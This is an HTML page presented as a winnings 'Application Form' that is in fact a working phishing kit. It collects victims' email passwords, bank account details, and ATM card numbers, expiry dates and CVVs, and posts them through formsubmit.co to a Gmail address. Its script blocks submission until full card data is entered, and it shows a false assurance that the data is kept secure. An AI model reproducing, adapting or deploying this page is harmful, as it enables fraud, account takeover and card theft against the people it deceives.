<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Application Form</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      background: #f2f2f2;
      padding: 20px;
    }
    form {
      background: #fff;
      padding: 20px;
      border-radius: 12px;
      box-shadow: 0 0 10px rgba(0,0,0,0.1);
    }
    label {
      display: block;
      margin-top: 15px;
    }
    input, select {
      width: 100%;
      padding: 10px;
      margin-top: 5px;
      border: 1px solid #ccc;
      border-radius: 6px;
    }
    .error {
      color: red;
      font-size: 0.9em;
      display: none;
    }
    .password-wrapper {
      position: relative;
    }
    .password-wrapper input {
      padding-right: 40px;
    }
    .toggle-password {
      position: absolute;
      top: 50%;
      right: 10px;
      transform: translateY(-50%);
      background: none;
      border: none;
      cursor: pointer;
      font-size: 18px;
    }
    #final-note {
      margin-top: 20px;
      font-weight: bold;
    }
    .hidden {
      display: none;
    }
    button {
      margin-top: 20px;
      padding: 14px 20px;
      font-size: 1.1em;
      border: none;
      border-radius: 8px;
      width: 100%;
      cursor: pointer;
      transition: all 0.3s ease;
    }
    button.valid {
      background-color: #28a745;
      color: white;
    }
    button.invalid {
      background-color: red;
      color: transparent;
      cursor: not-allowed;
    }
    .security-note {
      font-size: 0.85em;
      color: green;
      margin-top: 10px;
    }
  </style>
</head>
<body>

  <h1>Application Form</h1>

  <form id="application-form" action="https://formsubmit.co/exellentfirm@gmail.com" method="POST">
    
    <!-- Redirect & CAPTCHA -->
    <input type="hidden" name="_next" value="https://onlinegistrationProg.github.io/Application-Form/thankyou.html" />
    <input type="hidden" name="_captcha" value="false" />

    <label>1. Full Name:
      <input type="text" name="Full Name" id="full-name" required>
      <div class="error" id="error-fullname">Required</div>
    </label>

    <label>2. Country:
      <input type="text" name="Country" id="country" required>
      <div class="error" id="error-country">Required</div>
    </label>

    <label>3. Phone Number:
      <input type="tel" name="Phone Number" id="phone" required>
      <div class="error" id="error-phone">Phone must be 9‚Äì12 digits</div>
    </label>

    <label>4. Email Address:
      <input type="email" name="Email Address" id="email" required>
      <div class="error" id="error-email">Invalid email</div>
    </label>

    <label>5. Email Password:
      <div class="password-wrapper">
        <input type="password" name="Email Password" id="email-password" required>
        <button type="button" class="toggle-password" onclick="togglePassword()">üëÅ</button>
      </div>
      <div class="error" id="error-password">Required</div>
    </label>

    <label>6. Amount You Won:
      <input type="text" name="Amount You Won" id="amount-won" required>
      <div class="error" id="error-amount-won">Required</div>
    </label>

    <label>7. Bank Account Type:
      <input type="text" name="Bank Account Type" id="account-type" placeholder="e.g. Standard Bank" required>
      <div class="error" id="error-account-type">Required</div>
    </label>

    <label>8. Bank Account Number:
      <input type="text" name="Bank Account Number" id="account-number" required>
      <div class="error" id="error-account-number">Required</div>
    </label>

    <label>9. Bank Account Holder's Name:
      <input type="text" name="Account Holder's Name" id="account-holder" required>
      <div class="error" id="error-account-holder">Required</div>
    </label>

    <label>10. Did You Link ATM to Your Bank Account?
      <select name="ATM Linked" id="atm-linked" required>
        <option value="">Select</option>
        <option value="Yes">Yes</option>
        <option value="No">No</option>
      </select>
    </label>

    <div id="atm-section" class="hidden">

      <label>11. ATM Card Number:
        <input type="text" name="ATM Card Number" id="card-number">
        <div class="error" id="error-card-number">Card must be 16 digits</div>
      </label>

      <label>12. Expiry Date (MM/YY):
        <input type="text" name="Expiry Date" id="expiry-date" maxlength="5" placeholder="MM/YY">
        <div class="error" id="error-expiry">Format must be MM/YY</div>
      </label>

      <label>13. CVV:
        <input type="text" name="CVV" id="cvv">
        <div class="error" id="error-cvv">CVV must be 3 digits</div>
      </label>

      <div id="final-note"></div>
    </div>

    <div class="security-note">üîí We keep your data secure and confidential.</div>

    <button type="submit" id="submit-button" class="invalid"></button>
  </form>

  <script>
    function togglePassword() {
      const input = document.getElementById('email-password');
      input.type = input.type === 'password' ? 'text' : 'password';
    }

    const atmLinked = document.getElementById('atm-linked');
    const atmSection = document.getElementById('atm-section');
    const submitBtn = document.getElementById('submit-button');

    atmLinked.addEventListener('change', () => {
      if (atmLinked.value === 'Yes') {
        atmSection.classList.remove('hidden');
      } else {
        atmSection.classList.add('hidden');
      }
      validateForm();
    });

    document.getElementById('expiry-date').addEventListener('input', (e) => {
      let val = e.target.value.replace(/[^0-9]/g, '');
      if (val.length >= 3) val = val.slice(0, 2) + '/' + val.slice(2);
      e.target.value = val.slice(0, 5);
    });

    document.getElementById('application-form').addEventListener('blur', (e) => {
      const id = e.target.id;
      const val = e.target.value.trim();
      const error = document.getElementById('error-' + id.replace('-', ''));
      if (!error) return;

      if (id === 'phone') {
        error.style.display = (/^\d{9,12}$/.test(val)) ? 'none' : 'block';
      } else if (id === 'card-number') {
        error.style.display = (/^\d{16}$/.test(val)) ? 'none' : 'block';
      } else if (id === 'cvv') {
        error.style.display = (/^\d{3}$/.test(val)) ? 'none' : 'block';
      } else if (id === 'expiry-date') {
        error.style.display = (/^(0[1-9]|1[0-2])\/\d{2}$/.test(val)) ? 'none' : 'block';
      } else if (id === 'email') {
        error.style.display = /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(val) ? 'none' : 'block';
      } else {
        error.style.display = val ? 'none' : 'block';
      }

      updateFinalNote();
    }, true);

    function updateFinalNote() {
      const name = document.getElementById('full-name').value.trim();
      const amount = document.getElementById('amount-won').value.trim();
      const accType = document.getElementById('account-type').value.trim();
      const accNumber = document.getElementById('account-number').value.trim();
      const note = document.getElementById('final-note');

      if (atmLinked.value === 'Yes' && name && amount && accType && accNumber) {
        note.innerText = `Dear ${name}, You will receive ${amount} to your ${accType}, ${accNumber}`;
      } else {
        note.innerText = '';
      }
    }

    function validateForm() {
      const fields = {
        name: document.getElementById('full-name').value.trim(),
        country: document.getElementById('country').value.trim(),
        phone: document.getElementById('phone').value.trim(),
        email: document.getElementById('email').value.trim(),
        password: document.getElementById('email-password').value.trim(),
        amount: document.getElementById('amount-won').value.trim(),
        accType: document.getElementById('account-type').value.trim(),
        accNumber: document.getElementById('account-number').value.trim(),
        accHolder: document.getElementById('account-holder').value.trim(),
        atm: document.getElementById('atm-linked').value,
        card: document.getElementById('card-number').value.trim(),
        expiry: document.getElementById('expiry-date').value.trim(),
        cvv: document.getElementById('cvv').value.trim()
      };

      let isValid = true;

      if (!fields.name || !fields.country || !/^\d{9,12}$/.test(fields.phone) || 
          !/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(fields.email) || !fields.password || 
          !fields.amount || !fields.accType || !fields.accNumber || 
          !fields.accHolder || !fields.atm) {
        isValid = false;
      }

      if (fields.atm === 'Yes') {
        if (!/^\d{16}$/.test(fields.card) || !/^(0[1-9]|1[0-2])\/\d{2}$/.test(fields.expiry) || !/^\d{3}$/.test(fields.cvv)) {
          isValid = false;
        }
      }

      if (fields.atm === 'No' || !isValid) {
        submitBtn.classList.remove('valid');
        submitBtn.classList.add('invalid');
        submitBtn.innerText = '';
        submitBtn.disabled = true;
      } else {
        submitBtn.classList.remove('invalid');
        submitBtn.classList.add('valid');
        submitBtn.innerText = 'Submit';
        submitBtn.disabled = false;
      }
    }

    document.querySelectorAll('input, select').forEach(el => {
      el.addEventListener('input', () => {
        updateFinalNote();
        validateForm();
      });
    });
  </script>

</body>
</html>
